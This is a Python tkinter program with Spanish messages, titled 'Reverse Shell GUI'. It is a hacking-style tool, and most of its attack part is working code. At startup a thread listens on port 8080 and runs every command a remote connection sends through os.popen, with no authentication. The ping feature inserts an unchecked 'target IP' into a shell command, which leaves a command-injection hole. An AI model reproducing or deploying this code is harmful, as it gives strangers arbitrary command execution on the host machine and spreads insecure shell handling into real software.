import socket, os, requests, threading, socket
import tkinter as tk
from PIL import Image, ImageTk

hostname = socket.gethostname()
ip = socket.gethostbyname(hostname)

def send_command(command):
    try:
        output = os.popen(command).read()
        response_text.insert(tk.END, f'[*] Comando ejecutado: {command}\n', 'blue')
        response_text.insert(tk.END, output + '\n', 'blue')
    except Exception as e:
        response_text.insert(tk.END, f'[*] Error al ejecutar el comando: {command}\n{str(e)}\n', 'red')

def send_command_from_entry():
    command = command_entry.get()
    if command:
        send_command(command)
        command_entry.delete(0, tk.END)

def ping_target():
    try:
        if target_ip:
            if os.name == 'nt':
                ping_response = os.popen(f'ping -n 1 {target_ip}').read()
                response_text.insert(tk.END, ping_response + '\n', 'blue')  
            else:
                ping_response = os.popen(f'ping -c 1 {target_ip}').read()
                response_text.insert(tk.END, ping_response + '\n', 'blue')  
        else:
            response_text.insert(tk.END, '[*] Por favor, ingrese una IP objetivo primero.\n', 'red')
    except Exception as e:
        response_text.insert(tk.END, f'[*] Error al realizar el ping: {str(e)}\n', 'red') 

def check_internet_connection():
    try:
        g = requests.get('https://www.google.com/')
        status_code = g.status_code
        if status_code == 200:
            response_text.insert(tk.END, '[*] Hay conexión a internet en tu máquina\n', 'blue') 
        else:
            response_text.insert(tk.END, '[*] No hay conexión a internet en tu máquina\n', 'red') 
    except Exception as e:
        response_text.insert(tk.END, f'[*] No hay conexión a internet en tu máquina\n', 'red') 

def accept_connections():
    H = ip
    P = 8080
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((H, P))
    s.listen(1)
    response_text.insert(tk.END, f'[*] Escuchando conexiones en {H}:{P}\n', 'blue')  
    n, a = s.accept()
    response_text.insert(tk.END, f'[+] Conexión entrante: {a[0]}:{a[1]}\n', 'blue')  
    while True:
        command = n.recv(1024).decode()
        if not command:
            break
        response_text.insert(tk.END, f'[*] Comando recibido: {command}\n', 'blue')  
        send_command(command)
    n.close()

def save_target_ip():
    global target_ip
    target_ip = target_entry.get()
    response_text.insert(tk.END, f'[*] IP objetivo guardada: {target_ip}\n', 'blue') 

root = tk.Tk()
root.title("Reverse Shell GUI")
root.geometry("700x500")

icon_image = Image.open("shell.png")
icon_photo = ImageTk.PhotoImage(icon_image)
root.iconphoto(True, icon_photo)

input_frame = tk.Frame(root)
input_frame.pack(pady=10, padx=10, fill=tk.X)

target_entry_label = tk.Label(input_frame, text="IP Objetivo:", font=("Consolas", 12))
target_entry_label.grid(row=0, column=0, padx=(0, 10))

target_entry = tk.Entry(input_frame, width=30, font=("Consolas", 12))
target_entry.grid(row=0, column=1)

save_ip_button = tk.Button(input_frame, text="Guardar", font=("Consolas", 12), command=save_target_ip)
save_ip_button.grid(row=0, column=2, padx=(10, 0))

command_entry = tk.Entry(root, width=70, font=("Consolas", 12))
command_entry.pack(pady=(5, 5), padx=10)

button_frame = tk.Frame(root)
button_frame.pack(pady=5)

send_button = tk.Button(button_frame, text="Send Command", font=("Consolas", 12), command=send_command_from_entry)
send_button.pack(side=tk.LEFT, padx=5)

ping_button = tk.Button(button_frame, text="Ping", font=("Consolas", 12), command=ping_target)
ping_button.pack(side=tk.LEFT, padx=5)

internet_button = tk.Button(button_frame, text="Check Internet", font=("Consolas", 12), command=check_internet_connection)
internet_button.pack(side=tk.LEFT, padx=5)

response_text = tk.Text(root, font=("Consolas", 12))
response_text.pack(pady=10, padx=10, fill=tk.BOTH, expand=True)

threading.Thread(target=accept_connections, daemon=True).start()  

response_text.tag_configure('blue', foreground='blue')
response_text.tag_configure('red', foreground='red')

root.mainloop()
